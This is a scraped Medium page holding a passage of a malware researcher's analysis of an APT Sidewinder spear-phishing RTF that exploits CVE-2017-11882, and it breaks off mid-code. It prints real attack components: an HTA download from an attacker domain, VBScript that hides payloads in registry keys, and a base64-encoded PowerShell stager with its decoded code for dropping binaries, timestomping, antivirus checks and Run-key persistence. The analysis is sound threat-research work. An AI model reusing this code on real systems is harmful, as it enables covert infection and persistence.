.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"sebdraven.medium.com\"})":null,"postResult({\"id\":\"5bc1a7e7c84c\"})":{"__ref":"Post:5bc1a7e7c84c"}},"LinkedAccounts:11d98531eebe":{"__typename":"LinkedAccounts","mastodon":null,"id":"11d98531eebe"},"Membership:053eb905-f962-4628-8989-2a2e6e40254f":{"__typename":"Membership","tier":"MEMBER","id":"053eb905-f962-4628-8989-2a2e6e40254f"},"User:11d98531eebe":{"__typename":"User","id":"11d98531eebe","linkedAccounts":{"__ref":"LinkedAccounts:11d98531eebe"},"isSuspended":false,"name":"Sebdraven","imageId":"1*ycwwStTvoVxriAE2No5ipQ.jpeg","customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"sebdraven.medium.com"}},"hasSubdomain":true,"username":"sebdraven","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":543,"followingCount":9,"collectionFollowingCount":9},"bio":"Malwarist,Threat Huntist and pythonist \u002F core dev of #yeti\u002F member of @ProjectHoneynet \u002F co-organizer #BotConf \u002F researcher","membership":{"__ref":"Membership:053eb905-f962-4628-8989-2a2e6e40254f"},"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:11d98531eebe-viewerId:lo_bdf918410d03"},"twitterScreenName":"Sebdraven"},"Paragraph:9376201130db_0":{"__typename":"Paragraph","id":"9376201130db_0","name":"b4a6","type":"H3","href":null,"layout":null,"metadata":null,"text":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_1":{"__typename":"Paragraph","id":"9376201130db_1","name":"73e7","type":"H3","href":null,"layout":null,"metadata":null,"text":"Spear phishing","hasDropCap":true,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_2":{"__typename":"Paragraph","id":"9376201130db_2","name":"a25c","type":"P","href":null,"layout":null,"metadata":null,"text":"I’ve started few days ago an analysis on a RTF following my recent researches.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_3":{"__typename":"Paragraph","id":"9376201130db_3","name":"4ce6","type":"P","href":null,"layout":null,"metadata":null,"text":"I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_4":{"__typename":"Paragraph","id":"9376201130db_4","name":"9ab8","type":"P","href":null,"layout":null,"metadata":null,"text":"I execute rtfobj on it and two ole embedded objects malforfed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png":{"__typename":"ImageMetadata","id":"1*clv0SwElLXu5uycgGlttAA.png","originalHeight":247,"originalWidth":1322,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_5":{"__typename":"Paragraph","id":"9376201130db_5","name":"0e14","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_6":{"__typename":"Paragraph","id":"9376201130db_6","name":"e410","type":"P","href":null,"layout":null,"metadata":null,"text":"But rtfobj extracts succeffully two raws objects:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png":{"__typename":"ImageMetadata","id":"1*RoH4AT4fAqfiiy4hO3C8DA.png","originalHeight":39,"originalWidth":766,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_7":{"__typename":"Paragraph","id":"9376201130db_7","name":"c18f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_8":{"__typename":"Paragraph","id":"9376201130db_8","name":"6ef7","type":"P","href":null,"layout":null,"metadata":null,"text":"The object 6A2A1 is very interesting:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png":{"__typename":"ImageMetadata","id":"1*jg292b2dNzrsJddVxaqeuQ.png","originalHeight":310,"originalWidth":733,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_9":{"__typename":"Paragraph","id":"9376201130db_9","name":"2e3d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_10":{"__typename":"Paragraph","id":"9376201130db_10","name":"bc36","type":"P","href":null,"layout":null,"metadata":null,"text":"and this one:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png":{"__typename":"ImageMetadata","id":"1*irGqF14uiBKgitbGYHGjNg.png","originalHeight":150,"originalWidth":826,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_11":{"__typename":"Paragraph","id":"9376201130db_11","name":"1806","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_12":{"__typename":"Paragraph","id":"9376201130db_12","name":"2cc5","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact, the ole object is a exploit of CVE-2017–11882.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_13":{"__typename":"Paragraph","id":"9376201130db_13","name":"c509","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation is a bit different than my last article, there is not an object MTF.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_14":{"__typename":"Paragraph","id":"9376201130db_14","name":"6fe4","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation has many matching with the public exploit: https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":62,"end":113,"href":"https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_15":{"__typename":"Paragraph","id":"9376201130db_15","name":"2bdb","type":"P","href":null,"layout":null,"metadata":null,"text":"The exploitation is the following:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_16":{"__typename":"Paragraph","id":"9376201130db_16","name":"5e00","type":"P","href":null,"layout":null,"metadata":null,"text":"an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_17":{"__typename":"Paragraph","id":"9376201130db_17","name":"af13","type":"P","href":null,"layout":null,"metadata":null,"text":"caller.exe hxxp:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":11,"end":86,"href":"http:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_18":{"__typename":"Paragraph","id":"9376201130db_18","name":"9584","type":"P","href":null,"layout":null,"metadata":null,"text":"The hta is a mix of powershell, vbscript and javascript.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_19":{"__typename":"Paragraph","id":"9376201130db_19","name":"a5f5","type":"H3","href":null,"layout":null,"metadata":null,"text":"Installation of payload and Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_20":{"__typename":"Paragraph","id":"9376201130db_20","name":"654b","type":"P","href":null,"layout":null,"metadata":null,"text":"The installation of the payload made by vscript a line 151","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_21":{"__typename":"Paragraph","id":"9376201130db_21","name":"e570","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HK”&”CU\\Softwa”&”re\\Updater\\pa”&”rt3\", bnm, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_22":{"__typename":"Paragraph","id":"9376201130db_22","name":"d378","type":"P","href":null,"layout":null,"metadata":null,"text":"here","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_23":{"__typename":"Paragraph","id":"9376201130db_23","name":"c2d0","type":"P","href":null,"layout":null,"metadata":null,"text":"tst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”& Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\\Softwa”&”re\\Updater\\pa”&”rt3\")) & getProfile(“1”)\nobjWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” & tst & “”””, 0, true","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_24":{"__typename":"Paragraph","id":"9376201130db_24","name":"55e3","type":"P","href":null,"layout":null,"metadata":null,"text":"and here:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_25":{"__typename":"Paragraph","id":"9376201130db_25","name":"4cc1","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_26":{"__typename":"Paragraph","id":"9376201130db_26","name":"b229","type":"P","href":null,"layout":null,"metadata":null,"text":"The registry is used like pivot.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_27":{"__typename":"Paragraph","id":"9376201130db_27","name":"1f87","type":"P","href":null,"layout":null,"metadata":null,"text":"p1, p2 and bnm are three blobs of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_28":{"__typename":"Paragraph","id":"9376201130db_28","name":"94f8","type":"P","href":null,"layout":null,"metadata":null,"text":"bdm decoded is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_29":{"__typename":"Paragraph","id":"9376201130db_29","name":"7ba3","type":"BQ","href":null,"layout":null,"metadata":null,"text":"iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZHQgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9\"””)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_30":{"__typename":"Paragraph","id":"9376201130db_30","name":"3d63","type":"P","href":null,"layout":null,"metadata":null,"text":"There is a new base64 block decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_31":{"__typename":"Paragraph","id":"9376201130db_31","name":"7386","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;\n$ErrorActionPreference=’SilentlyContinue’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_32":{"__typename":"Paragraph","id":"9376201130db_32","name":"818a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”\n$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;\n$bin = “Winset.exe”;\ntry{\n$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}\ncatch{\n$cmdLine = $bin;\n}\n$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_33":{"__typename":"Paragraph","id":"9376201130db_33","name":"58ba","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binPath = $binDir + $bin;\n$binPathdll = $binDir + “cmpbk32.dll”;\n$dmybinPath = $binDir + “cmdl32.exe”;\n$rpcdllpath = $binDir + “57146C96.dll”;\n$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;\n$system = ‘HKCU:Software\\Updater’;\n$runExists = False;\n$pnameavr = “av” + “gn” + “t”;\n$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_34":{"__typename":"Paragraph","id":"9376201130db_34","name":"2203","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_35":{"__typename":"Paragraph","id":"9376201130db_35","name":"4b28","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_36":{"__typename":"Paragraph","id":"9376201130db_36","name":"f854","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_37":{"__typename":"Paragraph","id":"9376201130db_37","name":"2c33","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function wb64($path, $b64){\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($path,$bytes) | Out-Null;\n updt -t $path -b $cmdl32path\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_38":{"__typename":"Paragraph","id":"9376201130db_38","name":"0563","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function sb($h, $n ) {\n $len = $n.length;\n $limit = $h.length — $len;\n For( $i = 0; $i -le $limit; $i++ ) {\n $k = 0;\n For( ; $k -lt $len; $k++ ) {\n if( $n[$k] -ne $h[$i+$k] ) {break};\n }\n if( $k -eq $len ){return $i};\n }\n return -1;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_39":{"__typename":"Paragraph","id":"9376201130db_39","name":"14bf","type":"BQ","href":null,"layout":null,"metadata":null,"text":"if((Test-Path $env:WINDIR\\SysWOW64)){\n $msvbvmdllpath = $env:WINDIR + “\\SysWOW64\\msvbvm60.dll”\n $cmdl32path = $env:WINDIR + “\\SysWOW64\\cmdl32.exe”\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_40":{"__typename":"Paragraph","id":"9376201130db_40","name":"d993","type":"BQ","href":null,"layout":null,"metadata":null,"text":"try{\n if(!(Test-Path 